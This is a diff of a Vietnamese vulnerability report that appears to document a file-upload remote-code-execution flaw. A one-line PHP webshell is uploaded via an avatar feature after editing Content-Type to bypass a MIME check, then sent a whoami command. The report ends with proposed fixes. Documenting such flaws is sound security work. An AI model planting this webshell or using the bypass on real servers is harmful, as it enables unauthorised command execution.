@@ -260,7 +260,9 @@ Tạo file **`pls.php`** với nội dung:
 <?php echo system($_GET['command']); ?>
 ```
 ### 📌 3. Upload file pls.php thông qua chức năng Upload Avatar
-
+  | Test |  Check |
+  |---|---|
+  | ![Test](screenshots/testingimg.png) | ![Check](screenshots/checkimg.png) |
 ### 📌 4. Thực thi lệnh từ xa
 Gửi request thực thi lệnh whoami để xác định user chạy webserver:
 ```
@@ -277,11 +279,13 @@ desktop-4kbnl3q\ducson
 -👉 Điều này chứng minh lệnh đã được thực thi trên máy chủ.
 
 ### 🚨 5. Ảnh Chụp Màn Hình (PoC Visuals)
-Step	Description	Images
-1	Upload thành công file webshell pls.php.	📷
-2	Intercept request upload và chỉnh sửa Content-Type để bypass kiểm tra MIME.	📷
-3	Truy cập webshell qua trình duyệt và gửi lệnh whoami.	📷
-4	Response hiển thị kết quả apache, chứng minh RCE thành công.	📷
+| Bước | Mô tả | Hình ảnh |
+|------|------------|--------|
+| 1 | Kiểm tra webshell có thể tải lên hay không. | ![Check](screenshots/check-webshell.png) |
+| 2 | Tải lên file webshell `pls.php`. | ![Upload](screenshots/upload-webshell.png) |
+| 3 | Truy cập webshell qua trình duyệt và gửi lệnh. | ![Webshell-1](screenshots/webshell-1.png) |
+| 4 | Thực thi lệnh từ xa và nhận kết quả. | ![Webshell-2](screenshots/webshell-2.png) |
+| 5 | Response hiển thị kết quả `apache`, chứng minh RCE thành công. | ![Result](screenshots/result-rce.png) |
 ### 🔧 Biện Pháp Khắc Phục Được Đề Xuất
 #### ✅ 1. Kiểm tra loại file bằng MIME type thay vì chỉ kiểm tra phần mở rộng
 - Sử dụng finfo_file() để kiểm tra loại file thực sự:
